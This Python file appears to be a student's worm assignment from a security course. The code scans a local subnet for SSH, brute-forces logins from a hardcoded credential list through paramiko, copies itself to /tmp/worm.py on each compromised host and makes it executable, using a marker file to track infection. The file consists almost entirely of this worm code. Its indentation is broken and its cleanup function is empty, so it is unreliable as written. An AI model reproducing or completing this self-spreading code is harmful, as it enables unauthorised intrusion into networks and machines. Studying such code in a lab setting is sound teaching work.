import paramiko
import sys
import socket
import nmap
import netinfo
import os

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	
    # os.path.exists return true if file exists else false
    return os.path.exists(INFECTED_MARKER_FILE)
        
#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
    print("Mark file infected")
    worm = open(INFECTED_MARKER_FILE, "w")
    worm.write("Your system has been infected")
    worm.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
    
        sftpClient = sshClient.open_sftp()
    
   	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
    
	sftpClient.chmod("/tmp/worm.py", 0777)	

   	sshClient.exec_command("chmod a+x /tmp/worm.py")
 


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
 
	#connected = 1

        print("Try to connect to " + host +  " using " +  userName + " and " +  password)
    	try:
             sshClient.connect(host, username = userName, password = password)
             print("Opened a connectin to the victim's system!")
	     print("Credentials " + userName + " and " + password + " worked.")
	     return 0             
        except paramiko.SSHException:
             print("Wrong credentials! Try again.")
             return 1
        except socket.error:
             print("Server is down or has some other problem.")
             return 3

	#return connected
###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		
		if (0 == tryCredentials(host, username,password,ssh)):
                    	value = tryCredentials(host, username, password, ssh)
			print("Successfully compromised the system!")
			return ssh
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
 
	return netinfo.get_ip(interface)

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts

#######################################################
# Clean by removing the marker and copied worm program
# @param sshClient - the instance of the SSH client 
# connected to the victim system
#######################################################
def cleaner(sshClient): 
	# TODO:
	# remove the infection (i.e. marker file) from the host
	# remove the worm program from the host
	pass

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if not (isInfectedSystem()):
# TODO: Get the IP of the current system
		myIP = getMyIP("enp0s3")
		print("Attacker's current system IP " + myIP)

# Get the hosts on the same network
	print(" Get the hosts on the same network")
	networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
	networkHosts.remove(myIP)

	print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
	
		try:
			sftp = sshInfo.open_sftp()
        	 	remotepath = '/tmp/infected.txt'
		        localpath = '/home/cpsc/'
			sftp.get(remotepath, localpath)
			print("This system is already infected!")
		except IOError:
		       	print "This system should be infected"
			spreadAndExecute(sshInfo)
			print "Spreading complete"	
	

